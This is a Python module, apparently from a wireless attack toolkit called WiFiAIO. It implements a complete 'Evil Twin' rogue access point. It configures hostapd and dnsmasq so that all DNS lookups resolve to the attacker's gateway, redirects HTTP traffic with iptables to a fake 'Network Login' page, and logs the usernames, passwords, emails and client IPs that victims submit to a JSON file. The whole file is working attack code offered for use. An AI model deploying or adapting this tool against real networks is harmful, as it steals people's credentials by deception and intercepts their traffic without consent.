"""
WiFiAIO Evil Twin Module

Sets up a rogue access point (Evil Twin) with hostapd, DHCP/DNS via dnsmasq,
captive portal, and credential logging.
"""

import os
import re
import time
import json
import signal
import logging
import subprocess
import threading
from typing import List, Dict, Optional, Any, Tuple
from dataclasses import dataclass, field
from http.server import HTTPServer, BaseHTTPRequestHandler

from wifi_aio.exceptions import (
    WiFiConnectionError,
    WiFiPermissionError,
    WiFiTimeoutError,
    EvilTwinError,
)

logger = logging.getLogger(__name__)


@dataclass
class CapturedCredential:
    """Represents a captured credential from the captive portal."""
    timestamp: float
    username: str = ""
    password: str = ""
    email: str = ""
    custom_fields: Dict[str, str] = field(default_factory=dict)
    client_ip: str = ""
    client_mac: str = ""
    user_agent: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "timestamp": self.timestamp,
            "username": self.username,
            "password": self.password,
            "email": self.email,
            "custom_fields": self.custom_fields,
            "client_ip": self.client_ip,
            "client_mac": self.client_mac,
            "user_agent": self.user_agent,
        }


class CaptivePortalHandler(BaseHTTPRequestHandler):
    """
    HTTP request handler for the captive portal.

    FIX: Uses repr()/int() for status codes to prevent f-string injection.
    """

    # Class-level reference to credential store
    credential_callback = None
    portal_html = ""
    success_html = ""

    def log_message(self, format, *args):
        logger.debug("Captive portal: %s", format % args)

    def do_GET(self):
        """Serve the captive portal page."""
        self.send_response(int(200))
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Connection", "close")
        self.end_headers()

        # Substitute dynamic content safely
        html = self.portal_html
        self.wfile.write(html.encode("utf-8"))

    def do_POST(self):
        """Handle credential submission."""
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length).decode("utf-8", errors="replace")

        # Parse form data
        fields = {}
        if post_data:
            for pair in post_data.split("&"):
                if "=" in pair:
                    key, value = pair.split("=", 1)
                    import urllib.parse
                    fields[urllib.parse.unquote_plus(key)] = urllib.parse.unquote_plus(value)

        # Create credential record
        cred = CapturedCredential(
            timestamp=time.time(),
            username=fields.get("username", fields.get("user", "")),
            password=fields.get("password", fields.get("pass", "")),
            email=fields.get("email", ""),
            custom_fields={k: v for k, v in fields.items()
                          if k not in ("username", "user", "password", "pass", "email")},
            client_ip=self.client_address[0],
            user_agent=self.headers.get("User-Agent", ""),
        )

        # Callback with captured credential
        if self.credential_callback:
            try:
                self.credential_callback(cred)
            except Exception as e:
                logger.error("Credential callback error: %s", e)

        # FIX: Use int() for status code, not f-string
        self.send_response(int(302))
        self.send_header("Location", "/success")
        self.send_header("Connection", "close")
        self.end_headers()

    def handle_success(self):
        """Handle the success redirect page."""
        self.send_response(int(200))
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(self.success_html.encode("utf-8"))


class EvilTwin:
    """
    Evil Twin access point with captive portal for credential harvesting.

    FIX: Merges DNS into DHCP dnsmasq, tracks iptables rules for clean removal,
    tracks PIDs for proper process cleanup.
    """

    def __init__(self, interface: str = "wlan0",
                 internet_interface: str = "eth0",
                 ssid: str = "FreeWiFi",
                 channel: int = 6,
                 gateway_ip: str = "10.0.0.1",
                 dhcp_range_start: str = "10.0.0.10",
                 dhcp_range_end: str = "10.0.0.50",
                 portal_port: int = 80,
                 capture_file: str = "/tmp/wifiaio_credentials.json"):
        """
        Initialize EvilTwin.

        Args:
            interface: Wireless interface for the rogue AP.
            internet_interface: Interface with internet access for forwarding.
            ssid: SSID for the rogue AP.
            channel: Channel for the rogue AP.
            gateway_ip: Gateway IP for the DHCP server.
            dhcp_range_start: Start of DHCP range.
            dhcp_range_end: End of DHCP range.
            portal_port: Port for the captive portal HTTP server.
            capture_file: File path to store captured credentials.
        """
        self.interface = interface
        self.internet_interface = internet_interface
        self.ssid = ssid
        self.channel = channel
        self.gateway_ip = gateway_ip
        self.dhcp_range_start = dhcp_range_start
        self.dhcp_range_end = dhcp_range_end
        self.portal_port = portal_port
        self.capture_file = capture_file

        self._running = False
        self._captured_credentials: List[CapturedCredential] = []
        self._managed_pids: List[int] = []  # Track PIDs for cleanup
        self._iptables_rules: List[str] = []  # Track only OUR iptables rules
        self._portal_server: Optional[HTTPServer] = None
        self._portal_thread: Optional[threading.Thread] = None
        self._hostapd_conf = "/tmp/wifiaio_hostapd.conf"
        self._dnsmasq_conf = "/tmp/wifiaio_dnsmasq.conf"
        self._portal_html = self._default_portal_html()
        self._success_html = self._default_success_html()

    def _default_portal_html(self) -> str:
        """Generate default captive portal HTML."""
        return """<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Network Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; display: flex;
               justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 30px; border-radius: 8px;
                     box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; }
        h2 { text-align: center; color: #333; }
        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ddd;
                border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #4CAF50; color: white;
                 border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #45a049; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>WiFi Network Login</h2>
        <p style="text-align:center;color:#666;">Please authenticate to access the network.</p>
        <form method="POST" action="/">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>"""

    def _default_success_html(self) -> str:
        """Generate default success page HTML."""
        return """<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Connected</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; display: flex;
               justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .msg { background: white; padding: 30px; border-radius: 8px;
               box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        h2 { color: #4CAF50; }
    </style>
</head>
<body>
    <div class="msg">
        <h2>Connected!</h2>
        <p>You are now connected to the network.</p>
    </div>
</body>
</html>"""

    def _check_root(self) -> None:
        """Verify running as root."""
        if os.geteuid() != 0:
            raise WiFiPermissionError("Evil Twin requires root privileges")

    def _write_hostapd_config(self) -> None:
        """Write hostapd configuration file."""
        config = f"""interface={self.interface}
driver=nl80211
ssid={self.ssid}
channel={self.channel}
hw_mode=g
ieee80211n=1
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        try:
            with open(self._hostapd_conf, "w") as f:
                f.write(config)
            logger.debug("Wrote hostapd config to %s", self._hostapd_conf)
        except OSError as e:
            raise EvilTwinError(f"Failed to write hostapd config: {e}")

    def _write_dnsmasq_config(self) -> None:
        """
        Write dnsmasq configuration file.

        FIX: Merges DNS functionality into the DHCP dnsmasq config
        instead of running a separate DNS server.
        """
        config = f"""# WiFiAIO DHCP + DNS configuration
interface={self.interface}
dhcp-range={self.dhcp_range_start},{self.dhcp_range_end},12h
dhcp-option=3,{self.gateway_ip}
dhcp-option=6,{self.gateway_ip}

# DNS configuration - resolve all queries to our portal
address=/#/{self.gateway_ip}
listen-address={self.gateway_ip}
bind-interfaces
except-interface=lo
dhcp-authoritative

# Log DHCP transactions for monitoring
log-dhcp
log-queries
"""
        try:
            with open(self._dnsmasq_conf, "w") as f:
                f.write(config)
            logger.debug("Wrote dnsmasq config to %s", self._dnsmasq_conf)
        except OSError as e:
            raise EvilTwinError(f"Failed to write dnsmasq config: {e}")

    def _configure_interface(self) -> None:
        """Configure the wireless interface with gateway IP."""
        try:
            subprocess.run(
                ["ip", "addr", "flush", "dev", self.interface],
                check=True, capture_output=True, timeout=10
            )
            subprocess.run(
                ["ip", "addr", "add", f"{self.gateway_ip}/24", "dev", self.interface],
                check=True, capture_output=True, timeout=10
            )
            subprocess.run(
                ["ip", "link", "set", self.interface, "up"],
                check=True, capture_output=True, timeout=10
            )
            logger.info("Configured %s with IP %s", self.interface, self.gateway_ip)
        except subprocess.CalledProcessError as e:
            raise EvilTwinError(f"Failed to configure interface: {e.stderr.decode() if e.stderr else e}")
        except subprocess.TimeoutExpired:
            raise WiFiTimeoutError("Timeout configuring interface")

    def _add_iptables_rule(self, rule: List[str]) -> None:
        """
        Add an iptables rule and track it for later removal.

        FIX: Only tracks WiFiAIO's own rules, doesn't use iptables -F.
        """
        try:
            subprocess.run(
                ["iptables"] + rule,
                check=True, capture_output=True, timeout=10
            )
            rule_str = " ".join(rule)
            self._iptables_rules.append(rule_str)
            logger.debug("Added iptables rule: iptables %s", rule_str)
        except subprocess.CalledProcessError as e:
            raise EvilTwinError(f"Failed to add iptables rule: {e.stderr.decode() if e.stderr else e}")

    def _setup_iptables(self) -> None:
        """Set up iptables rules for NAT and traffic forwarding."""
        self._iptables_rules.clear()

        # Enable IP forwarding
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
        except OSError as e:
            raise EvilTwinError(f"Failed to enable IP forwarding: {e}")

        # NAT masquerade for internet access
        self._add_iptables_rule([
            "-t", "nat", "-A", "POSTROUTING",
            "-o", self.internet_interface, "-j", "MASQUERADE"
        ])

        # Forward traffic from rogue AP to internet
        self._add_iptables_rule([
            "-A", "FORWARD",
            "-i", self.interface, "-o", self.internet_interface,
            "-j", "ACCEPT"
        ])

        # Forward return traffic
        self._add_iptables_rule([
            "-A", "FORWARD",
            "-i", self.internet_interface, "-o", self.interface,
            "-m", "state", "--state", "RELATED,ESTABLISHED",
            "-j", "ACCEPT"
        ])

        # Redirect HTTP traffic to captive portal
        self._add_iptables_rule([
            "-t", "nat", "-A", "PREROUTING",
            "-i", self.interface,
            "-p", "tcp", "--dport", "80",
            "-j", "DNAT", "--to-destination", f"{self.gateway_ip}:{self.portal_port}"
        ])

        # Redirect DNS to our dnsmasq
        self._add_iptables_rule([
            "-t", "nat", "-A", "PREROUTING",
            "-i", self.interface,
            "-p", "udp", "--dport", "53",
            "-j", "DNAT", "--to-destination", f"{self.gateway_ip}:53"
        ])

        logger.info("Configured iptables rules for Evil Twin")

    def _remove_iptables_rules(self) -> None:
        """
        Remove only WiFiAIO's iptables rules.

        FIX: Only deletes rules we added, not iptables -F.
        """
        for rule_str in reversed(self._iptables_rules):
            # Replace -A with -D for deletion
            delete_rule = rule_str.replace(" -A ", " -D ", 1).replace(" -I ", " -D ", 1)
            try:
                subprocess.run(
                    ["iptables"] + delete_rule.split(),
                    capture_output=True, timeout=10
                )
                logger.debug("Removed iptables rule: iptables %s", delete_rule)
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
                # Rule might not exist, that's fine
                logger.debug("iptables rule already removed or not found: %s", delete_rule)
        self._iptables_rules.clear()
        logger.info("Cleaned up WiFiAIO iptables rules")

    def _kill_process(self, pid: int) -> None:
        """Kill a process by PID, tracking that we manage it."""
        try:
            os.kill(pid, signal.SIGTERM)
            time.sleep(0.5)
            # Check if still running
            try:
                os.kill(pid, 0)  # Doesn't actually kill, just checks
                os.kill(pid, signal.SIGKILL)
            except OSError:
                pass
            logger.debug("Killed process PID %d", pid)
        except OSError:
            pass

    def _start_hostapd(self) -> int:
        """Start hostapd and return PID."""
        self._write_hostapd_config()
        try:
            process = subprocess.Popen(
                ["hostapd", self._hostapd_conf],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            self._managed_pids.append(process.pid)
            logger.info("Started hostapd (PID %d)", process.pid)
            return process.pid
        except FileNotFoundError:
            raise EvilTwinError("hostapd not found. Install hostapd package.")

    def _start_dnsmasq(self) -> int:
        """Start dnsmasq for DHCP+DNS and return PID."""
        self._write_dnsmasq_config()
        try:
            process = subprocess.Popen(
                ["dnsmasq", "-C", self._dnsmasq_conf, "-d"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            self._managed_pids.append(process.pid)
            logger.info("Started dnsmasq (PID %d)", process.pid)
            return process.pid
        except FileNotFoundError:
            raise EvilTwinError("dnsmasq not found. Install dnsmasq package.")

    def _start_captive_portal(self) -> None:
        """Start the captive portal HTTP server in a background thread."""
        handler = type("CaptiveHandler", (CaptivePortalHandler,), {
            "credential_callback": self._on_credential_captured,
            "portal_html": self._portal_html,
            "success_html": self._success_html,
        })

        # Add success page handling via custom do_GET
        original_do_get = handler.do_GET

        def custom_do_get(self_handler):
            if self_handler.path == "/success":
                self_handler.send_response(int(200))
                self_handler.send_header("Content-Type", "text/html; charset=utf-8")
                self_handler.end_headers()
                self_handler.wfile.write(self_handler.success_html.encode("utf-8"))
            else:
                original_do_get(self_handler)

        handler.do_GET = custom_do_get

        try:
            self._portal_server = HTTPServer((self.gateway_ip, self.portal_port), handler)
            self._portal_thread = threading.Thread(
                target=self._portal_server.serve_forever,
                daemon=True,
            )
            self._portal_thread.start()
            logger.info("Captive portal running on %s:%d", self.gateway_ip, self.portal_port)
        except OSError as e:
            raise EvilTwinError(f"Failed to start captive portal: {e}")

    def _on_credential_captured(self, cred: CapturedCredential) -> None:
        """Handle a captured credential."""
        self._captured_credentials.append(cred)
        logger.info(
            "Captured credential from %s: username=%s",
            cred.client_ip, repr(cred.username)
        )
        self._save_credentials()

    def _save_credentials(self) -> None:
        """Save captured credentials to file."""
        try:
            data = [cred.to_dict() for cred in self._captured_credentials]
            with open(self.capture_file, "w") as f:
                json.dump(data, f, indent=2, default=str)
        except OSError as e:
            logger.error("Failed to save credentials: %s", e)

    def set_portal_html(self, html: str) -> None:
        """Set custom captive portal HTML."""
        self._portal_html = html

    def set_success_html(self, html: str) -> None:
        """Set custom success page HTML."""
        self._success_html = html

    def start(self) -> None:
        """
        Start the Evil Twin access point.

        Sets up hostapd, dnsmasq (DHCP+DNS), iptables, and captive portal.
        """
        self._check_root()

        if self._running:
            raise EvilTwinError("Evil Twin is already running")

        logger.info("Starting Evil Twin: SSID=%s, Channel=%d", self.ssid, self.channel)

        # Configure interface
        self._configure_interface()

        # Start hostapd
        self._start_hostapd()
        time.sleep(2)  # Wait for hostapd to initialize

        # Start dnsmasq (DHCP + DNS combined)
        self._start_dnsmasq()
        time.sleep(1)

        # Set up iptables
        self._setup_iptables()

        # Start captive portal
        self._start_captive_portal()

        self._running = True
        logger.info("Evil Twin is running")

    def stop(self) -> None:
        """
        Stop the Evil Twin access point.

        FIX: Only removes WiFiAIO's iptables rules, kills tracked PIDs.
        """
        if not self._running:
            logger.warning("Evil Twin is not running")
            return

        logger.info("Stopping Evil Twin")

        # Stop captive portal
        if self._portal_server:
            self._portal_server.shutdown()
            self._portal_server = None
        if self._portal_thread:
            self._portal_thread.join(timeout=5)
            self._portal_thread = None

        # Kill all managed processes by PID
        for pid in reversed(self._managed_pids):
            self._kill_process(pid)
        self._managed_pids.clear()

        # Remove only our iptables rules
        self._remove_iptables_rules()

        # Disable IP forwarding
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
        except OSError:
            pass

        # Clean up config files
        for conf_file in [self._hostapd_conf, self._dnsmasq_conf]:
            try:
                os.unlink(conf_file)
            except OSError:
                pass

        self._running = False
        logger.info("Evil Twin stopped")

    def get_credentials(self) -> List[CapturedCredential]:
        """Get all captured credentials."""
        return list(self._captured_credentials)

    def get_client_count(self) -> int:
        """Get number of connected clients from dnsmasq lease file."""
        lease_file = "/var/lib/misc/dnsmasq.leases"
        if not os.path.isfile(lease_file):
            lease_file = "/tmp/dnsmasq.leases"
        try:
            with open(lease_file, "r") as f:
                return sum(1 for line in f if line.strip())
        except OSError:
            return 0

    def is_running(self) -> bool:
        """Check if the Evil Twin is running."""
        return self._running

    def __del__(self):
        """Cleanup on destruction."""
        if self._running:
            self.stop()
